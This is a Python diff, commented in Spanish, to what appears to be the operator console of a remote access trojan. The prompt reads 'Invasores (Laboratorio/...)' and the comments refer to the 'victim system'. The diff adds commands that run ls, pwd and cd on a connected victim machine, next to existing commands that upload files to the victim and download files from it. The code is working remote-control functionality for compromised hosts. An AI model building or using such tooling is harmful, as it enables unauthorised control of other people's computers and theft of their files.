@@ -446,12 +446,18 @@ class Control():
 	# MODULOS PARA COMANDOS EXCEPCIONALES DEL SISTEMA VICTIMA
 
 	def ls(self):
-		return
+		self.servidor.enviar(self.objetivo,"ls")
+		self.servidor.recibir_todo(self.objetivo)
 
 	def pwd(self):
+		self.servidor.enviar(self.objetivo,"pwd")
+		self.servidor.recibir_todo(self.objetivo)
 		return
 
-	def cd(self):
+	def cd(self,ruta):
+		self.servidor.enviar(self.objetivo,ruta)
+		location = self.servidor.recibir(self.objetivo)
+		print(location)
 		return
 
 
@@ -507,7 +513,7 @@ def manipular(servidor,cliente):
 
 	control = Control(servidor,cliente)
 	
-	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')
+	victima = input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()
 
 	while (victima!="volver"):
 
@@ -532,7 +538,7 @@ def manipular(servidor,cliente):
 			origen = input(' Ruta archivo atacante: ')
 			destino = input(' Ruta archivo victima: ')
 			control.subir_archivos(origen,destino)
-
+ 
 		elif (victima=="descargar"):
 			origen = input(' Ruta archivo victima: ')
 			destino = input(' Ruta archivo atacante: ')
@@ -543,6 +549,17 @@ def manipular(servidor,cliente):
 		elif (victima=="ifconfig"):
 			control.ifconfig()
 
+
+		# MODULOS DE COMANDOS DE SISTEMA
+
+		elif (victima=="pwd"):
+			control.pwd()
+
+		elif (victima=="ls"):
+			control.ls()
+
+		elif ("cd " in victima):
+			control.cd(victima)
 
 		# MODULOS BASICOS
 
@@ -563,7 +580,7 @@ def manipular(servidor,cliente):
 		else:
 			print('\n [\033[1;31mx\033[0;39m] Comando "',victima, '" no encontrado.\n')
 
-		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')
+		victima = input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()
 
 	return
 
